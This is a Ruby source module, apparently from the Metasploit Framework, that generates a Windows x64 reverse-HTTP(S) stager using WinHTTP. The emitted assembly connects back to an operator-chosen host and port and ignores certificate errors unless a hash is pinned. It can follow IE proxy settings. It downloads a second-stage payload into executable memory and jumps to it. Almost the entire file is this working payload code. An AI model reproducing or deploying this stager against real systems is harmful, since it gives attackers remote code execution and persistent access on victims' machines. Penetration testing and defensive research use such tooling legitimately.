# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/reverse_http'
require 'rex/payloads/meterpreter/config'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S) using WinHTTP
#
###

module Payload::Windows::ReverseWinHttp_x64

  include Msf::Payload::Windows::ReverseHttp_x64

  #
  # Register reverse_winhttp specific options
  #
  def initialize(*args)
    super
    register_advanced_options([
        OptBool.new('HttpProxyIE', 'Enable use of IE proxy settings', default: true, aliases: ['PayloadProxyIE'])
      ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ssl:  opts[:ssl] || false,
      host: ds['LHOST'] || '127.127.127.127',
      port: ds['LPORT']
    }

    # Add extra options if we have enough space
    if self.available_space.nil? || required_space <= self.available_space
      conf[:uri]              = luri + generate_uri
      conf[:exitfunk]         = ds['EXITFUNC']
      conf[:verify_cert_hash] = opts[:verify_cert_hash]
      conf[:proxy_host]       = ds['HttpProxyHost']
      conf[:proxy_port]       = ds['HttpProxyPort']
      conf[:proxy_user]       = ds['HttpProxyUser']
      conf[:proxy_pass]       = ds['HttpProxyPass']
      conf[:proxy_type]       = ds['HttpProxyType']
      conf[:retry_count]      = ds['StagerRetryCount']
      conf[:proxy_ie]         = ds['HttpProxyIE']
      conf[:custom_headers]   = get_custom_headers(ds)
    else
      # Otherwise default to small URIs
      conf[:uri]              = luri + generate_small_uri
    end

    generate_reverse_winhttp(conf)
  end

  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttp(opts={})
    combined_asm = %Q^
      cld                 ; Clear the direction flag.
      and rsp, ~0xf       ; Ensure RSP is 16 byte aligned
      call start          ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp           ; rbp now contains the block API pointer
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length (wchars)
    space += 512 * 2

    # proxy (wchars)
    space += 128 * 2

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Custom headers? Ugh, impossible to tell
    space += 512

    # The final estimated size
    space
  end

  #
  # Convert a string into a NULL-terminated wchar byte array
  #
  def asm_generate_wchar_array(str)
    (str.to_s + "\x00").
      unpack("C*").
      pack("v*").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :url The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [String] :proxy_host The optional proxy server host to use
  # @option opts [Integer] :proxy_port The optional proxy server port to use
  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
  # @option opts [String] :proxy_user The optional proxy server username
  # @option opts [String] :proxy_pass The optional proxy server password
  # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
  #
  def asm_reverse_winhttp(opts={})

    retry_count       = [opts[:retry_count].to_i, 1].max
    verify_ssl        = nil
    encoded_cert_hash = nil
    encoded_uri       = asm_generate_wchar_array(opts[:uri])
    encoded_host      = asm_generate_wchar_array(opts[:host])

    # this is used by the IE proxy functionality when an autoconfiguration URL
    # is specified. We need the full URL otherwise the call to resolve the proxy
    # for the URL doesn't work.
    full_url = 'http'
    full_url << 's' if opts[:ssl]
    full_url << '://' << opts[:host]
    full_url << ":#{opts[:port]}" if opts[:ssl] && opts[:port] != 443
    full_url << ":#{opts[:port]}" if !opts[:ssl] && opts[:port] != 80
    full_url << opts[:uri]

    encoded_full_url = asm_generate_wchar_array(full_url)
    encoded_uri_index = (full_url.length - opts[:uri].length) * 2

    if opts[:ssl] && opts[:verify_cert_hash]
      verify_ssl = true
      encoded_cert_hash = opts[:verify_cert_hash].unpack("C*").map{|c| "0x%.2x" % c }.join(",")
    end

    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end

      proxy_info = asm_generate_wchar_array(proxy_info)
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])

    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:custom_headers])

    http_open_flags = 0x00000100 # WINHTTP_FLAG_BYPASS_PROXY_CACHE
    secure_flags = (
      0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
      0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
      0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
      0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA

    if opts[:ssl]
      http_open_flags |= 0x00800000 # WINHTTP_FLAG_SECURE
    end

    ie_proxy_autodect = (
      0x00000001 | # WINHTTP_AUTO_DETECT_TYPE_DHCP
      0x00000002 ) # WINHTTP_AUTO_DETECT_TYPE_DNS_A

    ie_proxy_flags = (
      0x00000001 | # WINHTTP_AUTOPROXY_AUTO_DETECT
      0x00000002 ) # WINHTTP_AUTOPROXY_CONFIG_URL

    asm = %Q^
        xor rbx, rbx
      load_winhttp:
        push rbx                      ; stack alignment
        mov r14, 'winhttp'
        push r14                      ; Push 'winhttp',0 onto the stack
        mov rcx, rsp                  ; lpFileName (stackpointer)
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
        call rbp
    ^

    if verify_ssl
      asm << %Q^
      load_crypt32:
        push rbx                      ; stack alignment
        mov r14, 'crypt32'
        push r14                      ; Push 'crypt32',0 onto the stack
        mov rcx, rsp                  ; lpFileName (stackpointer)
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
        call rbp
      ^
    end

    asm << %Q^
      winhttpopen:
        push rbx                      ; stack alignment
        push rbx                      ; NULL pointer
        mov rcx, rsp                  ; pwszAgent ("")
    ^

    if proxy_enabled
      asm << %Q^
        push 3
        pop rdx                       ; dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)
        call load_proxy_name
        db #{proxy_info}              ; proxy information
      load_proxy_name:
        pop r8                        ; pwszProxyName (stack pointer)
      ^
    else
      asm << %Q^
        push rbx
        pop rdx                       ; dwAccessType (0=WINHTTP_ACCESS_TYPE_DEFAULT_PROXY)
        xor r8, r8                    ; pwszProxyName (NULL)
      ^
    end

    asm << %Q^
        xor r9, r9                    ; pwszProxyBypass (NULL)
        push rbx                      ; stack alignment
        push rbx                      ; dwFlags (0)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}; WinHttpOpen
        call rbp
    ^

    if opts[:proxy_ie] == true && !proxy_enabled
      asm << %Q^
        mov r12, rax                  ; Session handle is required later for ie proxy
      ^
    end

    asm << %Q^
        call load_server_host
        db #{encoded_host}
      load_server_host:
        pop rdx                       ; pwszServerName
        mov rcx, rax                  ; hSession
        mov r8, #{opts[:port]}        ; nServerPort
        xor r9, r9                    ; dwReserved
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')} ; WinHttpConnect
        call rbp

        call winhttpopenrequest
    ^

    if opts[:proxy_ie] == true && !proxy_enabled
      asm << %Q^
        db #{encoded_full_url}
      ^
    else
      asm << %Q^
        db #{encoded_uri}
      ^
    end

    asm << %Q^
      winhttpopenrequest:
        mov rcx, rax                  ; hConnect
        push rbx
        pop rdx                       ; pwszVerb (NULL=GET)
        pop r8                        ; pwszObjectName (URI)
    ^

    if opts[:proxy_ie] == true && !proxy_enabled
      asm << %Q^
        mov r13, r8                   ; store a copy of the URL for later
        add r8, #{encoded_uri_index}  ; move r8 up to where the URI stars
      ^
    end

    asm << %Q^
        xor r9, r9                    ; pwszVersion (NULL)
        push rbx                      ; stack alignment
        mov rax, #{"0x%.8x" % http_open_flags}  ; dwFlags
        push rax
        push rbx                      ; lppwszAcceptType (NULL)
        push rbx                      ; pwszReferer (NULL)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')} ; WinHttpOpenRequest
        call rbp

      prepare:
        mov rsi, rax                  ; Store hConnection in rsi
    ^

    if proxy_enabled && proxy_user
      asm << %Q^
        call load_proxy_user          ; puts proxy_user pointer on stack
        db #{proxy_user}
      load_proxy_user:
        pop r8                        ; lpBuffer (stack pointer)
        mov rcx, rsi                  ; hConnection (connection handle)
        mov rdx, 0x1002               ; (0x1002=WINHTTP_OPTION_PROXY_USERNAME)
        push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
        pop r9
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
        call rbp
      ^
    end

    if proxy_enabled && proxy_pass
      asm << %Q^
        call load_proxy_pass          ; puts proxy_pass pointer on stack
        db #{proxy_pass}
      load_proxy_pass:
        pop r8                        ; lpBuffer (stack pointer)
        mov rcx, rsi                  ; hConnection (connection handle)
        mov rdx, 0x1003               ; (0x1003=WINHTTP_OPTION_PROXY_PASSWORD)
        push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
        pop r9
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
        call rbp
      ^
    end

    if opts[:proxy_ie] == true && !proxy_enabled
      asm << %Q^
        ; allocate space for WINHTTP_CURRENT_USER_IE_PROXY_CONFIG, which is
        ; a 32-byte structure
        sub rax, 32
        mov rdi, rsp                  ; save a pointer to this buffer
        mov rcx, rdi                  ; this buffer is also the parameter to the function
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')} ; WinHttpGetIEProxyConfigForCurrentUser
        call rbp

        test eax, eax                 ; skip the rest of the proxy stuff if the call failed
        jz ie_proxy_setup_finish

        ; we don't care about the "auto detect" flag, as it doesn't seem to
        ; impact us at all.

        ; check if there's an auto configuration URL
        mov rax, [rdi+8]
        test eax, eax
        jz ie_proxy_manual

        ; set up the autoproxy structure on the stack and get it ready to pass
        ; into the target function
        mov rcx, rbx
        inc rcx
        shl rcx, 32
        push rcx                      ; dwReserved (0) and fAutoLoginIfChallenged
        push rbx                      ; lpvReserved (NULL)
        push rax                      ; lpszAutoConfigUrl
        mov rax, #{ie_proxy_flags | ie_proxy_autodect << 32} ; dwAutoDetectFlags and dwFlags
        push rax
        mov r8, rsp                   ; put the structure in the parameter list

        ; prepare the proxy info buffer, 32 bytes required
        sub rsp, 32
        mov rdi, rsp                  ; we'll need a pointer to this later
        mov r9, rdi                   ; pass it as the 4th parameter

        ; rest of the parameters
        mov rcx, r12                  ; hSession
        mov rdx, r13                  ; lpcwszUrl

        ; finally make the call
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')} ; WinHttpGetProxyForUrl
        call rbp

        test eax, eax                 ; skip the rest of the proxy stuff if the call failed
        jz ie_proxy_setup_finish
        jmp set_ie_proxy              ; rdi points to the filled out proxy structure

      ie_proxy_manual:
        mov rax, [rdi+16]             ; check for the manual proxy
        test eax, eax
        jz ie_proxy_setup_finish

        add rdi, 8
        push 3
        pop rax
        mov [rdi], rax                ; set dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)

        ; fallthrough to set the ie proxy

      set_ie_proxy:
        ; we assume that rdi is going to point to the proxy options
        mov r8, rdi                   ; lpBuffer (proxy options)
        push 24
        pop r9                        ; dwBufferLength (size of proxy options)
        mov rcx, rsi                  ; hConnection (connection handle)
        push 38
        pop rdx                       ; (38=WINHTTP_OPTION_PROXY)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
        call rbp

      ie_proxy_setup_finish:
      ^
    end

    if retry_count > 1
      asm << %Q^
        push #{retry_count}
        pop rdi

      retryrequest:
      ^
    end

    if opts[:ssl]
      asm << %Q^
      winhttpsetoption_ssl:
        mov rcx, rsi                  ; hRequest (request handle)
        push 31
        pop rdx                       ; dwOption (31=WINHTTP_OPTION_SECURITY_FLAGS)
        push rdx                      ; stack alignment
        push #{"0x%.8x" % secure_flags}  ; flags
        mov r8, rsp                   ; lpBuffer (pointer to flags)
        push 4
        pop r9                        ; dwBufferLength (4 = size of flags)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
        call rbp

        xor r8, r8                    ; dwHeadersLen (0)
      ^
    end

    if custom_headers
      asm << %Q^
        call get_req_headers          ; lpszHeaders (pointer to the custom headers)
        db #{custom_headers}
      get_req_headers:
        pop rdx                       ; lpszHeaders
        dec r8                        ; dwHeadersLength (assume NULL terminated)
      ^
    else
      asm << %Q^
        push rbx
        pop rdx                       ; lpszHeaders (NULL)
      ^
    end


    asm << %Q^
        mov rcx, rsi                  ; hRequest (request handle)
        xor r9, r9                    ; lpszVersion (NULL)
        push rbx                      ; stack alignment
        push rbx                      ; dwContext (0)
        push rbx                      ; dwTotalLength (0)
        push rbx                      ; dwOptionalLength (0)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')} ; WinHttpSendRequest
        call rbp
        test eax, eax
        jnz handle_response
    ^

    if retry_count > 1
      asm << %Q^
      try_it_again:
        dec rdi
        jz failure
        jmp retryrequest
      ^
    else
      asm << %Q^
        jmp failure
      ^
    end

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        ; hard-coded to ExitProcess(whatever) for size
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
        call rbp                      ; ExitProcess(whatever)
      ^
    end

    asm << %Q^
      handle_response:
        mov rcx, rsi                  ; hRequest
        push rbx
        pop rdx                       ; lpReserved (NULL)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')} ; WinHttpReceiveResponse
        call rbp
        test eax, eax                 ; make sure the request succeeds
        jz failure
    ^

    if verify_ssl
      asm << %Q^
      ssl_cert_get_context:
        mov rcx, rsi                  ; Request handle (hInternet)
        push 78                       ; WINHTTP_OPTION_SERVER_CERT_CONTEXT
        pop rdx                       ; (dwOption)
        ; Thanks to things that are on the stack from previous calls, we don't need to
        ; worry about adding something to the stack to have space for the cert pointer,
        ; so we won't worry about doing it, it'll save us bytes!
        mov r8, rsp                   ; Stack pointer (lpBuffer)
        mov r14, r8                   ; Back the stack pointer up for later use
        push rbx                      ; 0 for alignment
        push 8                        ; One whole pointer
        mov r9, rsp                   ; Stack pointer (lpdwBufferLength)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
        call rbp
        test eax, eax                 ; use eax instead of rax, saves a byte
        jz failure                    ; Bail out if we couldn't get the certificate context

      ssl_cert_get_server_hash:
        mov rcx, [r14]                ; Cert context pointer (pCertContext)
        push 24                       ; sha1 length, rounded to multiple of 8
        mov r9, rsp                   ; Address of length (pcbData)
        mov r15, rsp                  ; Backup address of length
        sub rsp, [r9]                 ; Allocate 20 bytes for the hash output
        mov r8, rsp                   ; 20 byte buffer (pvData)
        mov r14, r8                   ; Back the stack pointer up for later use
        push 3
        pop rdx                       ; CERT_SHA1_HASH_PROP_ID (dwPropId)
        mov r10, #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
        call rbp
        test eax, eax                 ; use eax instead of rax, saves a byte
        jz failure                    ; Bail out if we couldn't get the certificate context

      ssl_cert_start_verify:
        call ssl_cert_compare_hashes
        db #{encoded_cert_hash}
      ssl_cert_compare_hashes:
        pop rax                       ; get the expected hash
        xchg rax, rsi                 ; swap hash and handle for now
        mov rdi, r14                  ; pointer to the retrieved hash
        mov rcx, [r15]                ; number of bytes to compare
        repe cmpsb                    ; do the hash comparison
        jnz failure                   ; Bail out if the result isn't zero
        xchg rax, rsi                 ; swap hash and handle back!

      ; Our certificate hash was valid, hurray!
      ^
    end

    asm << %Q^
      allocate_memory:
        push rbx
        pop rcx                       ; lpAddress (NULL)
        push 0x40
        pop rdx
        mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
        shl edx, 16                   ; dwSize
        mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')} ; VirtualAlloc
        call rbp

      download_prep:
        xchg rax, rbx                 ; store the allocated base in rbx
        push rbx                      ; store a copy for later
        push rbx                      ; temp storage for byte count
        mov rdi, rsp                  ; rdi is the &bytesRead

      download_more:
        mov rcx, rsi                  ; hRequest (request handle)
        mov rdx, rbx                  ; lpBuffer (pointer to mem)
        mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
        mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
        call rbp
        add rsp, 32                   ; clean up reserved space

        test eax, eax                 ; did the download fail?
        jz failure

        mov ax, word ptr [rdi]        ; extract the read byte count
        add rbx, rax                  ; buffer += bytes read

        test eax, eax                 ; are we done?
        jnz download_more             ; keep going
        pop rax                       ; clear up reserved space

      execute_stage:
        ret                           ; return to the stored stage address
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end

